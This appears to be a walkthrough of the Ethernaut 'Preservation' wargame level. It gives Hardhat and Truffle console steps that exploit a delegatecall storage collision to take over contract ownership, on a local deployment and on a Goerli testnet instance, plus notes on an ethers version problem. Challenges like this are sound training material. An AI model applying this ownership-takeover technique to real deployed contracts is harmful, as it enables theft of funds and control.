# Preservation

[Preservation](https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC)

Contract: <BR />
``0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220``


## Test Attack

```BASH
npx hardhat compile
npx hardhat console
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.deploy()
libctr.address

PreFactory = await ethers.getContractFactory("Preservation")
pre = await PreFactory.deploy(libctr.address, libctr.address)

AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.deploy()

// Get initial Owner and library address
await pre.owner()
await pre.timeZone1Library()    
libctr.address

// Change library to attack contract and confirm change
await pre.setFirstTime(attack.address)
await pre.timeZone1Library()
attack.address
libctr.address

// Change owner to whatever we want...
await pre.owner()
await pre.setFirstTime(attack.address)
await pre.owner()
await pre.timeZone1Library()
attack.address
```

<BR />


## Live Attack

Instance Address: <BR />
``0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220``


Attack Contract Address: <BR />
``0xA45bcbb0CeB2f15434fb1F4675151FDa8786D9Ca``


```BASH
npx hardhat compile
npx hardhat console --network goerli
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

PreFactory = await ethers.getContractFactory("Preservation")
pre = await PreFactory.attach('0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220')

AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.deploy()

// Get initial Owner and library address
await pre.owner()
await pre.timeZone1Library()    

// Change library to attack contract and confirm change
await pre.setFirstTime(attack.address)
await pre.timeZone1Library()
attack.address

// Change owner to whatever we want...
// Failing with out-of-gas!
await pre.owner()
await pre.setFirstTime(accounts[0].address) // FAILED!
await pre.timeZone1Library()
await pre.owner()

accounts[0].address
```

<BR />

## Live Attack Try 2

Since the attack was failing out of gas, and because of the problems in Hardhat we simply switch to truffle (``13_Preservation_Truffle``) and complete the attack as follows:

```BASH
truffle console --network goerli
```

```JS
sender = accounts[5]

pre    = await Preservation.at("0xFF3eC9eb96183C2B656588ddD8D80f243c6cA220")
attack = await Attack.at("0xA45bcbb0CeB2f15434fb1F4675151FDa8786D9Ca")

await pre.owner()
await pre.timeZone1Library()    
attack.address

await pre.setFirstTime(sender, {from: sender})
await pre.owner()
```

<BR />


## Others

When setting up Hardhat we ended up with a problem becuase of the Ethers version.
The problem was avoided by:

1. Delete node_modules
1. Copy over ``package.json`` and ``package-lock.json`` from ``11_GatekeeperTwo``
1. ``npm install``

Configuration that works:

```JS
// > ethers.version
// 'ethers/5.7.2'

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.connect(accounts[0]).deploy()
libctr.address
```

Problematic configuration:

```JS
// > ethers.version
// '6.5.1'

LibCtrFactory = await ethers.getContractFactory("LibraryContract")
libctr = await LibCtrFactory.connect(accounts[0]).deploy()
libctr.target
```

<BR />
